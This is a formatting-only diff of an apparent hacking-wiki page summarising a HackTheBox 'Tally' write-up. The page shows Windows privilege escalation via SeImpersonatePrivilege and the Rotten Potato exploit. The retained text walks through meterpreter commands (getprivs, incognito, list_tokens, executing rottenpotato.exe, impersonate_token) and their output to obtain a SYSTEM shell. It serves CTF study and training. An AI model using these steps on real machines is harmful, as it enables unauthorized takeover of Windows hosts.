@@ -2,7 +2,7 @@
 
 The info in this page info was extracted [from this post](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)
 
-Service accounts usually have special privileges \(SeImpersonatePrivileges\) and this could be used to escalate privileges.
+Service accounts usually have special privileges (SeImpersonatePrivileges) and this could be used to escalate privileges.
 
 [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 
@@ -10,7 +10,7 @@ I won’t go into the details on how this exploit works, the article above expla
 
 Let’s check our privileges with meterpreter:
 
-```text
+```
 meterpreter > getprivs
 
 Enabled Process Privileges
@@ -30,7 +30,7 @@ Excellent, it looks like we have the privileges we need to perform the attack. L
 
 Back on our meterpreter session we load the `incognito` extension.
 
-```text
+```
 meterpreter > use incognito
 Loading extension incognito...Success.
 meterpreter > list_tokens -u
@@ -50,7 +50,7 @@ No tokens available
 
 We can see we currently have no Impersonation Tokens. Let’s run the Rotten Potato exploit.
 
-```text
+```
 meterpreter > execute -f rottenpotato.exe -Hc
 Process 3104 created.
 Channel 2 created.
@@ -71,7 +71,7 @@ NT AUTHORITY\SYSTEM
 
 We need to quickly impersonate the token or it will disappear.
 
-```text
+```
 meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 [-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
              Call rev2self if primary process token is SYSTEM
@@ -82,4 +82,3 @@ Server username: NT AUTHORITY\SYSTEM
 ```
 
 Success! We have our SYSTEM shell and can grab the root.txt file!
-
